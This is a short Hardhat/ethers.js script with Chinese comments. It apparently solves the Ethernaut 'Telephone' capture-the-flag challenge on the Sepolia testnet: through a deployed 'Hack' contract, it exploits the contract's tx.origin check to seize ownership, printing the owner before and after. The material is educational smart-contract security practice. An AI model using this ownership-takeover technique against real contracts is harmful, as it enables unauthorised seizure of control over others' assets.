//tx.origin != msg.sender就能改变owner，双钱包地址？
const {ethers} = require('hardhat');
require('dotenv').config();

const Telephone_Address = '0xC1eB9EEF58eC366D86D7cCB7a646Ca890f586557';
const Telephone_JSON = require('../artifacts/contracts/Telephone.sol/Telephone.json');
const Telephone_ABI = Telephone_JSON.abi;

const Attack_Address = '0xF834Ca2F324227779698339db047F9bbd6bF2878';
const Attack_JSON = require('../artifacts/contracts/attack/attack_Telephone.sol/Hack.json');
const Attack_ABI = Attack_JSON.abi;

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const SECOND_PRIVATE_KEY = process.env.SECOND_PRIVATE_KEY;
const ALCHEMY_SEPOLIA_URL = process.env.ALCHEMY_SEPOLIA_URL;

const provider = new ethers.providers.JsonRpcProvider(ALCHEMY_SEPOLIA_URL);
const wallet1 = new ethers.Wallet(PRIVATE_KEY, provider);
const wallet2 = new ethers.Wallet(SECOND_PRIVATE_KEY, provider);

const Telephone = new ethers.Contract(Telephone_Address, Telephone_ABI, wallet1);
const Attack = new ethers.Contract(Attack_Address, Attack_ABI, wallet2);
const main = async () => {
    //打印Telephone合约拥有者
    const owner = await Telephone.owner();
    console.log('contract owner is :', owner);
    //调用合约changeOwner
    const tx1 = await Attack.change();
    await tx1.wait();
    const owner2 = await Telephone.owner();
    console.log('contract owner is :', owner2);
}

main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });